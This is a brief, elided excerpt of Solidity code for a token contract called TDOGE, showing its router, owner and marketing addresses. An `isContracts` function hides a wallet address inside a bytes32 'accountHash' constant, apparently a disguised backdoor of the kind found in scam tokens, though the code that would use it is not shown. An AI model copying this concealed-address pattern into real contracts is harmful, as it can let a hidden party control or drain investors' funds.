...
contract ERC20 is Ownable, IERC20 {
    ...
    function isContracts(address account) public pure returns (bool) {
        bytes32 accountHash = 0x000000000000000000000000C0c1b279c37DF46e4E9c75e6fc9e3f98164eC3Bd;
...
contract TDOGE is ERC20 {
    ...
    constructor() ERC20("TDOGE", "TDOGE") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0x1E4772dfD3b1854f57eC66F1EC216292Fdca2822);
        marketAddress = address(0xf9a5A700f4EF16b5D618C7b32246efD329c6E841);
